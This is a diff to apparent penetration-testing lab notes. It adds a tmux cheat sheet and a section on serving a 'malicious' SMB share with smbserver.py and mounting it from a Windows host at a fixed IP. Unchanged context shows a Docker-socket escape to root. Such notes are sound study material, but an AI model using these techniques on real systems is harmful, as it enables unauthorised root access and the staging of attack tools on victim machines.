@@ -27,8 +27,10 @@ Enumeration, exploitation, and privilege escalation notes, all in one place.
 - [Privilege Escalation](#privilege-escalation)
   - [Linux PE](#linux-pe)
 - [Arsenal](#arsenal)
+  - [TMUX](#tmux)
   - [Python Virtual Environment](#python-virtual-enviroment)
   - [File Transfers](#file-transfers)
+    - [Windows SMB](#windows-smb)
 
 
 ## Useful Sites
@@ -294,6 +296,39 @@ srw-rw---- 1 root docker 0 Mar  1  2025 /var/run/docker.sock
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 # Arsenal
+## TMUX
+```bash
+# Start a new tmux session
+tmux new -s <name>
+
+# Start a new session or attach to an existing session named mysession
+tmux new-session -A -s <name>
+
+# List all sessions
+tmux ls
+
+# kill/delete session
+tmux kill-session -t <name>
+
+# kill all sessions but current
+tmux kill-session -a
+
+# attach to last session
+tmux a
+tmux a -t <name>
+
+# start/stop logging with tmux logger
+prefix + [Shift + P]
+
+# split tmux pane vertically
+prefix + [Shift + %}
+
+# split tmux pane horizontally
+prefix + [Shift + "]
+
+# switch between tmux panes
+prefix + [Shift + O]
+```
 ## Python Virtual Environment
 ```bash
 
@@ -304,3 +339,10 @@ source venv/bin/activate
 deactivate
 ```
 ## File Transfers
+### Windows SMB
+```bash
+# Setup the malicious share
+sudo python3 smbserver.py share -smb2support /tmp/smbshare -username test -password test
+
+# Connection over Windows host
+C:\htb> net use n: \\192.168.220.133\share /user:test test
